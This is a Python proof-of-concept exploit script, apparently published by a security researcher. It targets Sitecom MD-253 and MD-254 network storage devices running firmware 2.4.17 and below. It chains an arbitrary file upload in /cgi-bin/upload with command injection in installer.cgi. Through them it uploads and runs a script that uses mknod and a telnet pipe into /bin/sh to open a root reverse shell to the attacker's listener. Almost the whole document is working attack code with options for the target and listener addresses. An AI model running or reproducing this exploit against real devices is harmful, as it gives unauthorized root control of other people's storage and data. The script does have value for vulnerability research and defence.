#!/usr/bin/python
#
# Exploit Title: Sitecom MD-253 and MD-254 Network Storage Reverse Shell Exploit
# Date: 09/11/12
# Exploit Author: Mattijs van Ommeren (mattijs _ at _ alcyon _ dot _nl)
# Vendor Homepage: http://www.sitecom.com
# Software Link: http://www.sitecom.com/download/5012/SitecomNas.2.4.17.bin
# Version: 2.4.17 and below
# Tested on: Windows 7 x64 and Backtrack 5 R1
# CVE : N/A
#
# This PoC exploit code demonstrates how several bugs in Sitecom MD-253 and MD-254 Network Storage
# devices can be combined to obtain a root shell.
#
# Firmware versions up to and including 2.4.17 are affected by the following vulnerabilities:
#
# 1. The /cgi-bin/upload CGI used by the firmware update function allows arbitrary file uploads that are:
#     - granted execute permissions
#     - not removed after uploading if they don't contain valid firmware
#     - stored in a predictable location
# 2. Installer.cgi contains a command injection vulnerability that allows one to run arbitrary commands as
#    root (only a limited character set can be used due to URL-encoding by CGI-handler)
#
# Known Limitations:
#   - Crude heuristics to determine whether a pseudo prompt needs to be echoed to stderr
#
# Vulnerability Details:
#   - http://www.alcyon.nl/advisories/aa-007
#   - http://www.alcyon.nl/advisories/aa-008
#
# Latest version of this exploit:
#   - http://www.alcyon.nl/blog/sitecom-poc-exploit
#
 
import sys
import os
import socket
import thread
import datetime
from optparse import OptionParser
 
upload_url = '/cgi-bin/upload'
cmd_inj_url = '/cgi-bin/installer.cgi?SetExecTable&%s'
sh_name = 'revsh'
 
sh_script = """
#!/bin/sh
mknod /tmp/backpipe p
telnet %s %s 0</tmp/backpipe | /bin/sh -C 1>/tmp/backpipe 2>/tmp/backpipe
# clean up our mess
rm -f /tmp/backpipe
rm -f /tmp/%s
""".rstrip('\r')
 
headers = """Host: %s\r
User-Agent: Mozilla/5.0 (PwNAS 1.0; rv:1.0)\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-us,en;q=0.5\r
Proxy-Connection: close\r
Referer: http://%s/firmware.htm\r
Cookie: language=en;\r\n"""
 
class Exploit:
 
    def stdin_thread(self, sock):
        try:
            fd = sys.stdin.fileno()
            while True:
                data = os.read(fd, 1024)
                if not data:
                    break
                while True:
                    nleft = len(data)
                    nleft -= sock.send(data)
                    if nleft == 0:
                        break
        except:
            pass
        sock.close()
        self.running = False
 
    def stdout_thread(self, sock):
        last = datetime.datetime.now() 
        try:
            fd = sys.stdout.fileno()
            while True:
                if (datetime.datetime.now()-last<datetime.timedelta(milliseconds=500)):
                    sys.stderr.write('# '); # Insert fake prompt
                last = datetime.datetime.now()
                data = sock.recv(1024)
                if not data:
                    break
                while True:
                    nleft = len(data)
                    nleft -= os.write(fd, data)
                    if nleft == 0:
                        break
        except Exception as e:
            print e
            pass
        sock.close()
        self.running = False
 
    def parse_options(self):
        parser = OptionParser(usage="usage: %prog [options]")
        parser.add_option("-r", "--remote-host", action="store", type="string", dest="hostname",
            help="Specify the host to connect to")
        parser.add_option("-l", "--listener-address", action="store", type="string", dest="listener_ip",
            help="Target IP for reverse shell connection")
        parser.add_option("-p","--port",action="store",type="int",dest="port",
            help="TCP port for the reverse shell connection")
 
        parser.set_defaults(hostname=None, listener_ip=None, port=7777)
        (options, args) = parser.parse_args();
 
        if(options.hostname == None):
            sys.stdout.write("Remote hostname/IP required\n")
            parser.print_help()
            sys.exit()
         
        #self.forced_bind = (options.listener_ip != None)
        self.listener_ip = options.listener_ip     
        self.hostname = options.hostname
        self.port = options.port
 
    def start_local_listener(self):
        self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,  1)
 
        try:
            self.serv.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
        except socket.error:
            sys.stderr.write("[-] Unable to set TCP_NODELAY")
         
        try:
            self.serv.bind((self.listener_ip, self.port))
        except:
            print "[-] Unable to bind to given IP-address. Attempting to bind on default address. You probably need a #NAT/PAT rule if you're behind a firewall."      
            try:
                self.serv.bind(('', self.port))
            except:
                print "[-] Unable to bind to default address. Aborting."
                sys.exit(2)
 
        print "[*] Listener started on %s:%s" % (self.serv.getsockname()[0], self.port)
             
        self.serv.listen(5)
        self.clientsock, addr = self.serv.accept()
        print "[*] Incoming connection from %s:%s" % (self.clientsock.getsockname()[0], self.clientsock.getsockname()[1])
        self.clientsock.send('/bin/busybox uname -a\n');
        banner = self.clientsock.recv(2048)
        if (banner.find('Linux'))>=0:
            print "[*] W00t W00t, got shell!\n\n%s\n" % banner     
        thread.start_new_thread(self.stdin_thread, (self.clientsock,))
        thread.start_new_thread(self.stdout_thread, (self.clientsock,))
         
    def connect_socket(self):
        print "[*] Connecting..."
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect( (self.hostname, 80) )
            if not self.listener_ip:
                self.listener_ip = self.socket.getsockname()[0]
            print "[*] Connected to %s (%s) " % (self.hostname, self.socket.getpeername()[0])
        except Exception as inst:
            print inst
            print "[-] Unable to connect"
            sys.exit(2)
             
    def upload_payload(self):
        print "[*] Uploading payload\n"
        try:
            self.socket.send('POST %s HTTP/1.1\n' % upload_url)
            self.send_headers()
            ct = 'Content-Type: multipart/form-data; boundary=---------------------------41184676334\r\n'
            begin_file='-----------------------------41184676334\r\n\
Content-Disposition: form-data; name="file"; filename="%s"\r\n\
Content-Type: application/octet-stream\r\n\r'
            end_file='\r\n-----------------------------41184676334--\r\n'
            pl = ''.join([begin_file, sh_script, end_file]) % (sh_name, self.listener_ip, self.port, sh_name)
            cl = 'Content-Length: %s\r\n\r\n' % (len(pl))
            crlf = '\r\n'
            data = ''.join([ct,cl,pl,crlf])
            self.socket.send(data)
            if self.socket.recv(2048).find("200 OK")>=0 and self.socket.recv(2048).find('/tmp/'+sh_name)>=0:
                print "[*] Payload succesfully uploaded"
                self.socket.close()
            else:
                print "[-] Unexpected response. Trying to proceed anyway."             
        except:
            print "[-] Error uploading payload. Aborting."
            sys.exit(2)
             
    def send_headers(self):
        data = headers %(self.hostname, self.hostname)
        self.socket.send(data)
     
    def execute_payload(self):
        print "[*] Executing payload"
        cmd = '/tmp/' + sh_name
        req = 'GET %s HTTP/1.1\r\n' % (cmd_inj_url % cmd)
        cr = '\r\n'
        self.socket.send(''.join([req,cr]))
        self.send_headers()
        if self.socket.recv(2048).find("200 OK")>=0:
            print "[*] Finished executing payload"
        self.socket.close()
 
    def run(self):
        self.line_buf = ''
        self.prompt = False
        self.parse_options()
        self.connect_socket()
        thread.start_new_thread(self.start_local_listener, ())
        self.upload_payload()
        self.connect_socket()
        self.execute_payload()
        print "[*] Waiting for reverse shell connection"
        self.running = True
        while self.running:
            pass
         
exploit = Exploit()
exploit.run()

